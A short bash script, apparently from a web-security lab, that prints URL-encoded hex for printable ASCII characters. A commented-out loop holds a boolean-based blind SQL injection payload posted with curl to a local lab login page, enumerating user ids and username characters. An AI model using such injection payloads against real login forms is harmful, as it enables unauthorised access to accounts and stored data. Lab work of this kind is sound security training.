#!/bin/bash


i=98


for c in {33..126};
do
	x=$(printf '%x' $c)
	echo "%$x"
	char=$(echo $x | xxd -r -p)
	echo "$char"
done


# while true; do
# 	curl -s --data "u=\" or id=$i and substring(username,6,1)=\"a\" -- " http://localhost/lab09/login.php > result.html

# 	file=$(<result.html)
# 	substring="cat.JPG"

# 	if [[ $file =~ $substring ]];
# 	then
# 		echo "admin"
# 		echo "$i"
# 		break	
# 	fi
# 	echo "it's not id $i"
# 	((i++))
# done

